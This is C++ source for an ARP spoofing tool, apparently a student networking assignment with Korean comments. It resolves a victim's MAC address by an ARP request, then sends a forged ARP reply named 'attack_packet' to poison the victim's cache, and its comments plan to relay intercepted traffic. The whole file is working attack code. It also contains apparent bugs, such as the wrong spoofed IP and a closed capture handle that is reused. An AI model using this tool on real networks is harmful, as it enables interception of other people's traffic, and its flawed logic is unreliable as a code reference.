#include <iostream>
#include <cstring>
#include <cstdio>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <pcap.h>
#include <libnet.h>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

char my_mac[18] = "";
char my_ip[15] = "";

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <target-ip>\n");
    printf("sample: send-arp-test wlan0 192.168.0.1\n");
}

void formatMacAddress(char* mac) {
    char segments[6][3] = {0}; // MAC 주소의 각 부분을 저장할 배열
    int segmentIndex = 0;
    const char* token = mac;
    char formattedMac[18];
    char segment[3];

    while (*token) {
        int length = 0;

        while (*token && *token != ':' && length < 2) {
            segment[length++] = *token++;
        }
        segment[length] = '\0';

        if (length == 1) {
            segments[segmentIndex][0] = '0';
            segments[segmentIndex][1] = segment[0];
        } else {
            strcpy(segments[segmentIndex], segment);
        }

        segmentIndex++;
        if (*token == ':') {
            token++;
        }
    }

    snprintf(formattedMac, 18, "%s:%s:%s:%s:%s:%s",
             segments[0], segments[1], segments[2],
             segments[3], segments[4], segments[5]);
    memcpy(mac, formattedMac , 18);
}

void get_my_Adr(const char *iface, uint8_t *mac, uint8_t *ip) {
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    memcpy(ip, &ipaddr->sin_addr.s_addr, sizeof(ipaddr->sin_addr.s_addr));

    close(fd);
}

int main(int argc, char* argv[]) {
    map<string, string> sender;
    map<string, string> target;

    if (argc < 4 ) {
        usage();
        return -1;
    }

    uint8_t inface_mac[6];
    uint8_t interface_ip[4];


    char* dev = argv[1];

    get_my_Adr(dev, inface_mac, interface_ip);


    sprintf(my_mac,"%02x:%02x:%02x:%02x:%02x:%02x",
            inface_mac[0], inface_mac[1], inface_mac[2],
            inface_mac[3], inface_mac[4], inface_mac[5]);
    sprintf(my_ip,"%d.%d.%d.%d",
            interface_ip[0], interface_ip[1], interface_ip[2], interface_ip[3]);

    printf("MAC: %s\n", my_mac);
    printf("IP: %s\n", my_ip);


    int cnt = ( argc -2 ) / 2;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    for(int i = 0 ; i < cnt ; i++ ){

        EthArpPacket to_send_packet;

        to_send_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        to_send_packet.eth_.smac_ = Mac(my_mac);
        to_send_packet.eth_.type_ = htons(EthHdr::Arp);

        to_send_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        to_send_packet.arp_.pro_ = htons(EthHdr::Ip4);
        to_send_packet.arp_.hln_ = Mac::SIZE;
        to_send_packet.arp_.pln_ = Ip::SIZE;
        to_send_packet.arp_.op_ = htons(ArpHdr::Request);
        to_send_packet.arp_.smac_ = Mac(my_mac);
        to_send_packet.arp_.sip_ = htonl(Ip(my_ip));
        to_send_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        to_send_packet.arp_.tip_ = htonl(Ip(argv[2+(i*2)]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_send_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        char sender_mac[18];
        struct pcap_pkthdr* header;
        const u_char* reply_packet;

        while (true) {
            int ret = pcap_next_ex(handle, &header, &reply_packet);
            if (ret == 1) {
                EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
                if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp){
                    printf("%u\n",reply->arp_.sip());
                    printf("%u\n",Ip(argv[2+(i*2)]));
                }
                if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
                    Ip(argv[2+(i*2)]) == reply->arp_.sip()){
                    ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, sender_mac);
                    break;
                }
            }
        }


        // char errbuf[PCAP_ERRBUF_SIZE];
        // pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        // if (handle == nullptr) {
        //     fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        //     return -1;
        // }

        // EthArpPacket to_target_packet;

        // to_target_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        // to_target_packet.eth_.smac_ = Mac(my_mac);
        // to_target_packet.eth_.type_ = htons(EthHdr::Arp);

        // to_target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        // to_target_packet.arp_.pro_ = htons(EthHdr::Ip4);
        // to_target_packet.arp_.hln_ = Mac::SIZE;
        // to_target_packet.arp_.pln_ = Ip::SIZE;
        // to_target_packet.arp_.op_ = htons(ArpHdr::Request);
        // to_target_packet.arp_.smac_ = Mac(my_mac);
        // to_target_packet.arp_.sip_ = htonl(Ip(my_ip));
        // to_target_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        // to_target_packet.arp_.tip_ = htonl(Ip(argv[3+(i*2)]));

        // int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_target_packet), sizeof(EthArpPacket));
        // if (res1 != 0) {
        //     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
        // }

        // char target_mac[18];

        // while (true) {
        //     int ret = pcap_next_ex(handle, &header, &reply_packet);
        //     if (ret == 1) {
        //         EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
        //         // if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp){
        //         //     printf("%u\n",reply->arp_.sip());
        //         //     printf("%u\n",Ip(argv[3+(i*2)]));
        //         // }
        //         if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
        //             Ip(argv[3+(i*2)]) == reply->arp_.sip()){
        //             ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, target_mac);
        //             break;
        //         }
        //     }
        // }

        formatMacAddress(sender_mac);
        //formatMacAddress(target_mac);

        printf("my mac : %s\n",my_mac);
        printf("my ip : %s\n", my_ip);
        printf("sender mac : %s\n", sender_mac);
        printf("sender ip : %s\n",argv[2+(i*2)]);
        // printf("target mac : %s\n", target_mac);
        printf("target ip : %s\n",argv[3+(i*2)]);

        //여기까지 받은데이터로 ip 주소별로 mac을 키로 만들어서 저장


        EthArpPacket attack_packet;

        attack_packet.eth_.dmac_ = Mac(sender_mac);
        attack_packet.eth_.smac_ = Mac(my_mac);
        attack_packet.eth_.type_ = htons(EthHdr::Arp);

        attack_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        attack_packet.arp_.pro_ = htons(EthHdr::Ip4);
        attack_packet.arp_.hln_ = Mac::SIZE;
        attack_packet.arp_.pln_ = Ip::SIZE;
        attack_packet.arp_.op_ = htons(ArpHdr::Reply);
        attack_packet.arp_.smac_ = Mac(my_mac);
        attack_packet.arp_.sip_ = htonl(Ip(argv[2+(i*2)]));
        attack_packet.arp_.tmac_ = Mac(sender_mac);
        attack_packet.arp_.tip_ = htonl(Ip(argv[2+(i*2)]));

        int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
        }
        printf("clear\n");
        pcap_close(handle);
    }
    //받은 데이터들을 바탕으로 전부 공격 패킷 날려 놓기

    /*
    여기부터는 계속 반복문 돌리면서 받는 패킷들을 전부 dst ip를 구분하여 mac주소를 수정해준뒤 전송
    */

    return 0;
}
